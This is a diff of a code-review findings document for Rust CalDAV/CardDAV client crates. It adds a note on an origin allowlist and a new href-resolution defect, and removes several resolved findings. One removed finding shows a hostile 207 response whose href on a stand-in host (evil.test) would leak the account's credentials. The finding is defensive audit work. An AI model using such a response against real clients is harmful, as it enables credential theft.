@@ -34,14 +34,43 @@ Categories were checked against the tree on 2026-08-23; where the check changed 
 marker line says so. No finding text was altered, compressed, or removed.
 
 The published-surface findings in this document, collected: the recurrence-override EventId
-contract, the cross-origin href rebasing, the single-collection cursor scope, the CardDAV phantom
-address book, the silently-ignored CalDAV calendar move, and the `bifrost-dav` collapse proposal.
+contract, the single-collection cursor scope, the CardDAV phantom address book, the
+silently-ignored CalDAV calendar move, and the `bifrost-dav` collapse proposal.
+
+Accepted residual from round 1, on the record: the credential-origin allowlist makes a request to
+an origin outside the trusted set fail locally rather than silently going out unauthenticated. A
+consumer whose server names resource hrefs on a *third* origin - one that is neither the configured
+base nor a discovered home - now gets a hard local error where it previously got a credential leak.
+That is the intended trade. It is a behavior change, not an API change: no published item was
+removed, renamed, or reshaped.
 
 Highest severity, ahead of its position in the document: **the recurrence-override EventId finding
 destroys an entire recurring series on an instance delete, verified against the current tree (no
-`#` guard exists anywhere in either crate), and the cross-origin href finding leaks the account
-credential to any host a compromised or hostile server names in a 207.** Both are C1 and both are
-worse than a document ordered by discovery makes them look.
+`#` guard exists anywhere in either crate).** It is worse than a document ordered by discovery
+makes it look.
+
+## Multistatus hrefs are resolved against the configured base URL, not against the request URI
+
+**C2 latent defect. Found 2026-08-23 by the round-1 fix-and-commit stage, not by the original
+hunt.** Every `resolve_href` / `resolve_hrefs` call site in both crates passes `self.base_url` as
+the base: `list_calendars_for_operation`, `list_events_listing`, the multiget and sync-collection
+readers, and the CardDAV equivalents. RFC 4918 makes a multistatus `href` relative to the *request
+URI*, not to whatever root the account happens to be configured with. The two coincide for the
+common deployment, where the base URL is the DAV root and servers emit absolute-path hrefs, which
+is why this has never bitten.
+
+It acquires a fuse in this round. The credential-origin allowlist now deliberately supports a
+calendar or address book home on a *different origin* than the configured base - that is the
+legitimate deployment the allowlist was written not to break. A PROPFIND against such a home whose
+response carries relative hrefs will resolve them against the base origin, producing collection and
+resource URLs on the wrong host. Those URLs are on the base origin, so the allowlist passes them,
+and they simply 404 (or, worse, hit an unrelated resource of the same path). Reported as
+"not found" rather than as a resolution bug.
+
+Fix: resolve against the request URI at each decode boundary rather than against `base_url`. Left
+open deliberately - it changes the value of native ids at twelve call sites across two crates, and
+landing that unreviewed at the end of a round is exactly the shape the loop keeps paying for. It
+wants its own round, or at minimum its own review.
 
 ## Recurrence-override EventIds are unusable as resource ids; event_delete on one instance destroys the whole series
 
@@ -74,24 +103,6 @@ classified error, or make them real (resolve to the resource, locate the VEVENT 
 and splice/remove that component; a `THISANDFUTURE`-free instance edit is tractable, an instance
 delete means emitting `EXDATE` on the master).
 
-## A malicious or misconfigured DAV server can steer authenticated requests to any host
-
-**C1 live defect (security). PUBLISHED SURFACE.** Verified 2026-08-23: `resolve_url` returns any
-`http://`/`https://` href verbatim and `auth_headers` attaches Basic credentials or the bearer token
-unconditionally on every request built from one. Credential exfiltration to an attacker-named host.
-Published-surface only in that the fix rejects ids a consumer can pass today; the allowlist itself
-is internal and the fix should not wait on that.
-
-`resolve_href` (both `parse.rs`) and `resolve_url` (both `client.rs`) return an href verbatim when
-it starts with `http://`/`https://`. Multistatus hrefs come from the server; they become native ids;
-native ids come back as URLs for `get_event`/`put_event`/`delete_event`/`fetch_vcards`, each of
-which attaches `Authorization` (Basic credentials or the bearer token) via `auth_headers`. So a 207
-containing `<D:href>https://evil.test/x.ics</D:href>` exfiltrates the account credential on the next
-hydration or write. The hardened `dav_redirect_policy` guards redirects only; it never sees the
-initial request URL. The same holds for `CalendarId`/`AddressBookId`/`ContactId` values handed in by
-a consumer. Both crates already compute the trusted host for the redirect policy; the same allowlist
-should gate href rebasing (reject or path-relativize a cross-origin href at the decode boundary).
-
 ## Cursor sync only ever covers one collection
 
 **C1 live defect. PUBLISHED SURFACE.** Verified 2026-08-23: `discover_cursor_scopes` still yields a
@@ -110,40 +121,6 @@ appear in inventory or changes, and never get an update or a delete. Neither ref
 a limitation; `reference/caldav.md` describes the cursor as if it were the account's whole event
 surface. Either the scope needs to be per-collection (`CursorScope` per calendar href, which is the
 honest model), or the limitation needs to be stated loudly.
-
-## CardDAV discovery has a dead fallback leg
-
-**C1 live defect (small).** Verified 2026-08-23: the `None` arm still assigns `well_known_url` and
-the function then reissues the identical PROPFIND against it, so the retry is provably
-identity-valued and discovery fails against any server whose `.well-known` answers 200 with
-something that is not a principal response. The trailing paragraph about the two crates discovering
-in opposite orders is **C3** - no stated reason is not the same as a defect.
-
-`CardDavClient::discover_addressbook_home`: if the `.well-known/carddav` PROPFIND succeeds but the
-body carries no `current-user-principal`, `dav_root` is set to `well_known_url` and the function
-issues the same PROPFIND to the same URL with the same body, guaranteed to produce the same `None`,
-then errors "missing current-user-principal". It never falls back to `base_url`, which is presumably
-the intent (that is what the error arm does). Costs one wasted round trip and makes discovery fail
-against any server that answers `.well-known` with a 200 that is not a DAV principal response (a
-login page, an SPA index).
-
-Also: CalDAV discovers base-first-then-well-known, CardDAV discovers well-known-first-then-base. Two
-crates, two orders, no stated reason.
-
-## A partly-parseable time range silently turns into a full-collection download
-
-**C1 live defect.** Verified 2026-08-23: `calendar_query_body` emits the `time-range` element only
-on `(Some, Some)` and falls to `String::new()` otherwise, so a one-sided or unparseable bound ships
-an unfiltered `calendar-query` with `<C:calendar-data/>` attached. Unbounded transfer on a large
-collection; the local `event_in_range` guard hides it from the caller.
-
-`caldav_query_time` returns `None` on an unparseable `EventTime`, and `calendar_query_body` emits a
-`time-range` element only when both start and end are `Some`. So one bad bound (or a one-sided
-range) produces a `calendar-query` with no time filter at all: the server returns every VEVENT in
-the collection, all of it hydrated with `calendar-data`, and the local `event_in_range` guard then
-throws most of it away. On a large calendar this is a multi-megabyte accidental full sync per call.
-CalDAV's `time-range` allows `start`-only and `end`-only forms; use them, and make a genuinely
-unparseable bound an error rather than "fetch everything".
 
 ## CardDAV fabricates a phantom address book that CalDAV deliberately stopped fabricating
 
@@ -195,20 +172,6 @@ fetch, then PUTs to `client.resolve_url(&event.0)`, the original location. A cal
 an event between calendars gets `Ok(())` and no move. `CardDavAccount::contact_update` handles the
 same case explicitly with a `local_error` ("cannot move contacts between address books"). CalDAV
 should do the same, or implement `MOVE`.
-
-## event_get stamps the wrong calendar on the event
-
-**C1 live defect.** Verified 2026-08-23: `fetch_event_from_url` builds `CalendarId(calendar_url)`
-from `Self::calendar_url(&client, &default_calendar_url, calendar)` and `event_get` passes
-`calendar: None`, so a non-default event comes back claiming the default calendar in both its
-`calendar_id` and its `provenance.calendar_native`. CardDAV's `contact_addressbook_url` shows the
-fix; no published shape changes.
-
-`fetch_event_from_url` with `calendar: None` (which is what `event_get` always passes) builds
-`CalendarId(default_calendar_url)` and puts it on the returned `CalendarEvent` and in
-`provenance.calendar_native`. Fetch an event that lives in a non-default calendar and it comes back
-claiming to belong to the default one. CardDAV solves this: `fetch_contact_from_url` derives the
-collection from the resource URL via `contact_addressbook_url`. CalDAV has no equivalent.
 
 ## RSVP is a non-atomic two-phase write with no compensation
 
@@ -266,21 +229,6 @@ Relatedly, `PROPFIND_CONTACTS` (CardDAV) does not request `resourcetype`, so
 `as_failed_contact_href` claims "a failed collection is not a transiently-failed resource" as if it
 were checking, when the only thing standing between a sub-collection and the failed-href lane is the
 `.vcf` suffix.
-
-## extract_href_properties ignores propstat status
-
-**C2 latent defect.** Verified 2026-08-23: `extract_href_properties` walks the document flat with an
-`in_property` flag and never inspects the enclosing propstat status, so a 404 propstat echoing an
-href is adopted. Contained fix, no published shape changes, and it closes a hole in an invariant
-both reference docs state without qualification.
-
-Every other parser in both crates stages properties per-propstat and commits only on 2xx; that
-invariant is the headline of both reference docs. `extract_href_property` /
-`extract_href_properties` (used for `current-user-principal`, `calendar-home-set`,
-`addressbook-home-set`, `schedule-outbox-URL`, `calendar-user-address-set`) walk the document flat
-and return any href found inside an element with the right local name, regardless of the enclosing
-propstat's status. A 404 propstat for `calendar-home-set` that echoes an href would be adopted as
-the home. Low probability, but it is a hole in an invariant the docs state without qualification.
 
 ## The structural finding: these are one crate wearing two hats
 
